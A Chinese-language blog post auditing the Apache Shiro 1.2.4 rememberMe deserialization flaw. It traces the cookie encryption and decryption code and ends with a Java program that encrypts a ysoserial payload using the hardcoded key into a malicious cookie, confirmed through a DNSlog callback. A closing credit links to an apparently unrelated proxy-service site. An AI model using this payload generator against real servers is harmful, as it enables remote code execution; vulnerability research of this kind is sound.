
### 一、Apache Shiro 简介：


Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。并且在实现此目标时无须依赖第三方的框架、容器或服务，当然也能做到与这些环境的整合，使其在任何环境下都可拿来使用。


Shiro将目标集中于Shiro开发团队所称的“四大安全基石”\-认证（Authentication）、授权（Authorization）、会话管理（Session Management）和加密（Cryptography）：


(1\) 认证（Authentication）：用户身份识别。有时可看作为“登录（login）”，它是用户证明自己是谁的一个行为。
(2\) 授权（Authorization）：访问控制过程，好比决定“认证（who）”可以访问“什么（what）”.
(3\) 会话管理（SessionManagement）：管理用户的会话（sessions），甚至在没有WEB或EJB容器的环境中。管理用户与时间相关的状态。
(4\) 加密（Cryptography）：使用加密算法保护数据更加安全，防止数据被偷窥。
对于任何一个应用程序，Shiro都可以提供全面的安全管理服务。并且相对于其他安全框架，Shiro要简单的多。


### 二、漏洞分析：


#### 1、漏洞产生流程：


(1\) 加密流程：
`值 -> 序列化 -> AES加密 -> base64编码 -> 生成一个 cookie值形成 rememberMe=cookie的形式`


(2\) 解密流程 (漏洞产生)：
`payload -> base64解码 -> AES解密 -> 反序列化 (造成反序列化漏洞)`


#### 2、漏洞代码审计：


##### (1\) 加密流程：


首先观察在 CookieRemembaerMeManager.java 中的 rememberSerializedIdentity 方法，它将序列化后的值进行 base64编码后的字符串设置为 cookie 的值：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921092617879-1743583748.png)


查看该方法在哪里被调用，跟进查看：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921092727662-339687649.png)


跟进可知 rememberSerializedIdentity方法被 rememberIdentity方法所调用：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921092828427-1430785528.png)


跟进查看 rememberIdentity方法：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921093018554-675753752.png)


可以看到在下面 rememberIdentity方法进行了函数重载：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921093317378-207200063.png)


继续跟进重载后的 rememberIdentity方法，可以发现该方法被 onSuccessfulLoogin方法调用：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921093444166-1276125941.png)


总体逻辑即为，登录成功后，会调用 AbstractRememberManager.onSuccessfulLogin方法，生成加密的 rememberMe\=cookie值，然后将这个生成的 cookie值 设置为用户的cookie值。


接着 在 if(isRememberMe(token))代码处打赏断点：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921093938538-595389778.png)


运行代码，进入Web端，输入默认口令，选中 "记住我" 即 rememberMe 选项，提交表单：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921094146818-2004511117.png)


回到代码断点位置，可以看到运行至断点处的 token的值：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921094332378-1398670223.png)


接下来进行跟进，逐步分析代码，跟进 isRememberMe方法，分析可知，这个方法的作用是判断用户有无勾选 rememberMe 选项，有则返回 true，否则返回 false：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921094641748-1990672294.png)


已知我们已经勾选了 rememberMe选项，返回 true，进入下一步调用 rememberIdentity方法：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921094902154-1356780263.png)


跟进 rememberIdentity方法，这个方法会首先生成一个 principalColletion对象\-\>principles，principles中保存用户的登录信息：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921095146186-1497377814.png)


下一步，调用 rememberIdentity方法，跟进该方法，通过分析代码可知，该方法首先调用 convertPrincipalsToBytes方法对 principles值进行一个序列化的操作：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921095624582-102413550.png)


跟进 convertPrincipalsToBytes方法，可以看到该方法先使用 serialize方法对 principles值进行序列化，然后调用 encrypt方法对序列化后的值进行加密：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921095823096-1238182447.png)


跟进 serialize方法，调用setSerializer()中的 serialize方法，继续跟进第二个 serialize方法，第二个serialize方法就是对参数值进行一个正常的序列化操作：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921100053372-1512839617.png)


步过 serialize方法，进入 if(getCipherService() !\= null) 的判断逻辑，跟进 getCipherService方法，通过分析，可以判断其是 aes加密：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921100528844-1439108680.png)


跟进 cipherService：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921100733327-525447561.png)


继续跟进，可以发现采用了硬编码的密钥，这也是 shiro(1\.2\.4\)反序列化漏洞产生的关键条件之一
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921101038096-146821827.png)


可以继续跟进，获取到该硬编码密钥，通过该密钥，攻击者可以对 payloads进行构造，是 shiro(1\.2\.4\)反序列化漏洞产生的关键条件之一
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921101144527-1200608424.png)


继续步过，进入 encrpt方法的加密逻辑：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921101340627-2053992715.png)


跟进 encrypt方法，该方法先获取 principles被序列化后的值，然后对该值使用 cipherService.encrypt方法进行加密：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921101546444-393743483.png)


跟进 cipherService.encrypt方法，该方法中，使用硬编码的key，iv向量进行了很经典的 AES加密：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921101828003-91137809.png)


通过以上逻辑总结可得，convertPrinciplesToBytes方法就是先对 principles值先进行了 序列化操作，然后对序列化后的值进行了 AES加密，但是 AES加密采用了固定的硬编码Key导致可逆，会被恶意利用。


步过 convertPrinciplesToBytes方法，进入 rememberSerializedIndentity方法的逻辑：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921102253625-822077080.png)


跟进 rememberSerializedIdentity方法，就是先对 序列化和加密后的值进行base64编码，并将编码后的值设置为用户的cookie值：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921102513117-693034489.png)


综上所述，加密流程即为：
principles值 \-\> 序列化 \-\> AES加密 \-\> base64编码 \-\> 生成一个 cookie值形成 rememberMe\=cookie的形式


##### (2\) 解密流程以及漏洞产生的原因：


有加密方法 encrypt，对应的也有解密方法，如下所示：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921103941684-1771964064.png)


向上层查看跟进 decrypt在哪里被调用：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921104142430-1847173897.png)


decrypt方法在 convertBytesToPrinciples方法中被调用，继续向上跟进 convertBytesToPrinciples方法在哪里被调用：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921104426318-1409169239.png)


如上图所示下断点，跟进查看 getRememberSerializedIdentity方法，发现 getRememberSerializedIdentity方法中会获取 请求包中的cookie的值并进行base64解密，这个获取到的cookie的值对于攻击者来说是可控的：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921104759311-1479728296.png)


步过进入 convertBytesToPrinciples方法：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921105438585-1485554860.png)


该方法首先使用 decrypt方法对 传入参数使用固定的硬编码Key进行aes解密操作：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921105655659-1906381436.png)


接着调用 deserialize方法对aes解密后的值进行反序列化，跟进deserialize方法：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921105800930-790117554.png)


继续跟进getSerializer().deserialize方法，发现 deserialize方法被进行了重写：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921105934165-1355661082.png)


继续跟进分析重写后的方法，使用了 readObject方法，导致了反序列化漏洞的产生：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921110112565-906560918.png)


解密流程与漏洞产生的基本逻辑如下：
`获取请求包中的cookie值 -> base64解码 -> aes解密 -> 反序列化`


但是由于请求包中的cookie值可控 以及 aes加密采用的是硬编码固定Key，导致攻击流程如下：
`攻击者构造payload命令 -> 手动序列化 -> 使用固定硬编码Key进行手动加密 -> 手动base64加密 -> 构造出完整的payload命令 -> 在请求包Cookie中构造 rememberMe=payload字段进行send发包 -> getRememberSerializedIdentity方法获取cookie值 -> base64解码 -> aes解密 -> 反序列化 -> readObject()函数导致产生反序列化漏洞。`


#### 3、漏洞攻击复现：


##### (1\) 复现工具：



```
(一) dnslog
(二) ysoserial
(三) 加密脚本

```

首先使用 ysoserial工具构造 java反序列化攻击payload：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921111540451-1200905920.png)


![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921111600511-7020074.png)


使用脚本对payload进行加密操作：



```
package org.XxxX.shiro;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.nio.file.FileSystems;
import java.nio.file.Files;

public class ShiroRememberMeGenPayload {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("C:/Users/lenovo/Desktop/代码审计/ysoserial-master/payload/payload.txt"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));  //硬编码固定Key值

        ByteSource ciphertext = aes.encrypt(payloads, key);
        BufferedWriter out = new BufferedWriter(new FileWriter("payload.txt"));  
        out.write(ciphertext.toString());
        out.close();
        System.out.printf("OK");

    }
}

```

运行代码生成 payload.txt：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921112110261-1223175925.png)


复制 payload值将其构造为 rememberMe\=payload 添加至 Cookie字段，然后放包：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921112324481-1907986335.png)


dnslog回显，即可证明漏洞存在：
![image](https://img2024.cnblogs.com/blog/3366919/202409/3366919-20240921112401349-1815962769.png)


 本博客参考[wgetCloud机场](https://tabijibiyori.org)。转载请注明出处！
